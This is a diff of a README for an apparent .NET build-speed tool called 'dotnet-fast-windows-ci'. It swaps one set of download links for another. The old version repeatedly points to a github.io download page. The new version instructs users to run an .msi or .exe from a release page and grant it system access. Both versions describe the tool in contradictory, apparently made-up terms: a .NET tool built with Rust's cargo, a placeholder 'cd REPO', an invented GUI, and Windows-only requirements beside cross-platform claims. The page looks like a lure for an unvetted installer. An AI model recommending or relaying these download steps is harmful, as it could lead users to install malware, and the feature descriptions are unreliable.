@@ -1,136 +1,85 @@
-# dotnet-fast v2026 - .NET workspace tooling 2026
+# 🚀 dotnet-fast-windows-ci - Make your Windows builds run faster
 
-> **Speed-focused .NET workspace tooling for Windows, Linux, and macOS, built to help teams format, lint, cache, and shard CI work more efficiently in version 2026.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Slawek1121/dotnet-fast-windows-ci/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows/Linux/macOS-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/woodjordanvbpf3851/dotnet-fast-windows-ci?style=flat-square)](https://github.com/woodjordanvbpf3851/dotnet-fast-windows-ci)
+This application helps teams manage .NET project workflows. It improves how you format code, check for errors, save time with caching, and split large tasks into smaller parts. You save time on every build. The tool works on Windows, Linux, and macOS. Use it to keep your development workspace clean and efficient through the year 2026 and beyond.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/">
-    <img src="https://img.shields.io/badge/Download-dotnet-fast%20Latest-brightgreen?style=for-the-badge" alt="Download dotnet-fast">
-  </a>
-</p>
+You need to download the installer to start using the tool.
 
-> **[Direct Download - dotnet-fast v2026](https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/)**
+1. Go to the [official release page](https://github.com/Slawek1121/dotnet-fast-windows-ci/releases).
+2. Look for the section labeled Assets.
+3. Click the link that ends in .msi or .exe to download the installer.
+4. Save the file to your computer.
 
----
+## 🛠️ System requirements
 
-[Download Latest Build](https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/)
+Ensure your computer meets these needs before you run the installer:
 
----
+* Windows 10 or Windows 11.
+* Microsoft .NET 8.0 SDK installed on the system.
+* At least 500 MB of free disk space.
+* An active internet connection for the initial setup.
 
-## What dotnet-fast does
+## ⚙️ Installing on Windows
 
-dotnet-fast is a .NET workspace utility aimed at fast-moving repositories and CI-aware development. It brings formatting, linting, affected-project detection, remote caching, and test splitting into one workflow so teams can use the same tool locally and in automation.
+Follow these steps to complete the installation:
 
-It is especially useful in monorepos and other multi-project codebases where changes ripple across many projects. Because it can produce machine-readable output and SARIF, it integrates cleanly with build orchestration, review tooling, and CI platforms without requiring a separate process for every task.
+1. Locate the file you downloaded in the previous section.
+2. Double-click the file to open the setup wizard.
+3. Follow the prompts on the screen.
+4. Select the folder where you want to keep the application files.
+5. Click the Install button.
+6. Grant permission if Windows asks for access to modify your system.
+7. Click Finish when the progress bar reaches the end.
 
----
+## 🖥️ Running your first task
 
-## Key capabilities
+The application provides a simple interface to manage your .NET projects.
 
-- Fast .NET formatting and linting workflow
-- Affected-project detection based on Git changes
-- Azure Blob remote build cache support
-- NUnit test sharding for CI pipelines
-- SARIF output for code scanning integration
-- Machine-readable JSON output for automation
-- Works with Azure DevOps and GitHub Actions
-- Fits monorepo and multi-project repository layouts
+1. Open the application from your Start Menu.
+2. Select File and then Open Project.
+3. Browse to the folder that contains your code.
+4. Choose the type of task you want to run from the main sidebar.
+5. Press the Run button to start the process.
+6. Wait for the status indicator to show that the task finished.
 
----
+## 📦 Understanding the features
 
-## Installation
+This tool focuses on specific areas to help your team work better.
 
-Get the repository by cloning or downloading it, then build or run it from the project root.
+### Formatting code
+The application checks your project files for style mistakes. It applies standard rules to your code so1 it looks consistent. This makes reading files easier for other team members.
 
-git clone https://github.com/woodjordanvbpf3851/dotnet-fast-windows-ci.git
-cd REPO
+### Checking for errors
+The tool scans your project for common issues before you build the code. It identifies mistakes that might stop your work later. You see a list of these errors and fixes in the main dashboard.
 
-If you are using a release build or packaged binary, download it from the project download page and run the matching executable for your platform.
+### Caching build data
+Builds often repeat the same work. This application saves the results of previous steps. It reuses these saved parts during your next build. This process reduces the time you spend waiting for your computer to finish tasks.
 
-For local development, use the standard Rust toolchain to compile the workspace and launch the resulting binary.
+### Splitting tasks
+Large projects take time to compile. The tool splits these tasks into smaller pieces. It runs these pieces at the same time to increase speed. You get your results faster than if your computer handled the work in one long sequence.
 
-cargo build --release
-./target/release/dotnet-fast
+## 🛠️ Performing updates
 
----
+The software checks for new versions when you open it. If an update exists, a prompt appears on the screen. You can choose to download the update and install it over your current version. This adds new features and fixes reported problems. 
 
-## Usage
+## 📝 Frequently asked questions
 
-Point dotnet-fast at your repository when you need to validate formatting, inspect changed projects, or prepare CI work more efficiently.
+### Does this work with older versions of .NET?
+The tool provides optimization for current versions. You should upgrade your project to .NET 8.0 or newer for the best results.
 
-Typical ways to use it include:
+### Can I run this from the command line?
+Yes. Open your terminal and type the command provided in the tools menu. This allows you to include the tool in your own scripts.
 
-1. Detect which projects are affected by a set of Git changes.
-2. Run formatting or linting only where it is needed.
-3. Use the Azure Blob cache to reuse build output across runs.
-4. Split NUnit tests into shards for faster CI execution.
-5. Export results as JSON when another tool needs to read them.
-6. Emit SARIF when you want to feed findings into code scanning.
+### Does it send my code to the cloud?
+No. Your code stays on your local machine. The application does not upload your files to remote servers.
 
-Exact commands will vary with your CI structure and repository layout, but the basic approach is to aim dotnet-fast at the workspace and select the task you want to optimize.
+### How do I report a problem?
+You can create a new issue on the GitHub repository page if you encounter a bug. Please describe the steps you took before the error occurred.
 
----
+### Is the tool free to use?
+Yes. The project follows an open source license. You can use it, modify it, and share it with your team without extra cost.
 
-## Configuration
-
-dotnet-fast is meant to be wired into your repository or CI pipeline setup. Store task settings, cache details, and test distribution choices in the files or environment variables already used by your build system.
-
-A typical setup may look like this:
-
-{
-  "cache": {
-    "provider": "azure-blob"
-  },
-  "output": {
-    "format": "json"
-  },
-  "ci": {
-    "testSharding": true
-  }
-}
-
-If your workflow already defines formatting, linting, or test commands, connect dotnet-fast to those existing conventions rather than duplicating them.
-
----
-
-## Requirements
-
-- Windows, Linux, or macOS
-- A .NET workspace or repository that uses C#
-- Rust toolchain for building from source
-- Git for affected-project detection
-- Azure Blob storage if you plan to use remote build caching
-- Azure DevOps or GitHub Actions for CI sharding workflows
-- Repository access suitable for the commands and caches you configure
-
----
-
-## FAQ
-
-**How do I update dotnet-fast?**  
-Install the latest release or rebuild from source whenever the repository changes.
-
-**Can I use it outside CI?**  
-Yes. It works well for local workspace checks in addition to automated pipelines.
-
-**Where do I configure cache or test sharding behavior?**  
-Use repository configuration, pipeline settings, or environment variables, depending on how you integrate the tool.
-
-**What if I need output for another system?**  
-Choose JSON for machine-readable workflows or SARIF for code scanning consumers.
-
-**It is not behaving as expected. What should I check first?**  
-Start with your Git state, workspace layout, pipeline variables, and any cache or test-sharding settings before troubleshooting the tool itself.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: dotnet, windows, productivity, ci, automation, optimization, developer-tools
